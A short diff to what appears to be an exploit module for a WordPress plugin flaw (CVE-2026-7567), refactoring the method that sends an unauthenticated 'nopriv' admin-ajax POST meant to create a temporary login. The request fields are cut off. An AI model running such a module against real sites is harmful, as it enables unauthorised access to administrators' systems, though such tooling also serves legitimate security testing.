@@ -22,13 +22,14 @@ class CVE20267567TemporaryLogin(WordPressModule):
 
     async def exploit_remote_primitive(
         self,
-        target: Target,
         client: CPointedClient,
+        wp_path: str,
         *,
+        target: Target,
         timeout: float,
     ) -> dict:
         """PoC-shaped POST: nopriv create path + login duration (align nonce with SA)."""
-        ajax = self._path(target, "/wp-admin/admin-ajax.php")
+        ajax = self._path_for_wp(wp_path, "/wp-admin/admin-ajax.php")
         out: dict = {"admin_ajax_posts": []}
         try:
             fields = {
